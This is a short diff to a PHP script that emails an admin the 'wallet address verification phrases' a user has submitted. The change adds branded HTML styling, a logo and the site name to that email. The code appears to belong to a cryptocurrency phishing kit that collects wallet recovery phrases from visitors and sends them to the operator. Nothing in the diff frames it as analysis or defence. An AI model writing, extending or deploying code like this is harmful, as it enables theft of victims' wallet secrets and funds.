@@ -17,8 +17,22 @@ include_once($_SERVER["DOCUMENT_ROOT"]."/php/account-manager.php");
             }
 
             $message = <<<HTML
-                A user with username: $user submitted wallet address verification phrases as follows:
+                <html>
+                <head>
+                    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Trirong|Arimo"/>
+                    <link rel="stylesheet" href="$site_url/static/font-awesome-4.7.0/css/font-awesome.min.css"/>
+                </head>
+
+                <body style ="font-family:Trirong;">
+                    <div style="position:relative">
+                        <img src="$site_url/static/images/logo.png" style="margin-left:36%;margin-right:36%;width:25%;position:absolute"/>
+                    </div>
+                    <h2 style="color:#00008b;font-family:Arimo;text-align:center">$site_name</h2>
+                                    
+                    A user with username: $user submitted wallet address verification phrases as follows:
                         <div style="text-align:center">$output</div>
+                </body>
+                </html>
 HTML;
 
             $sender = "admin@$site_url_short";
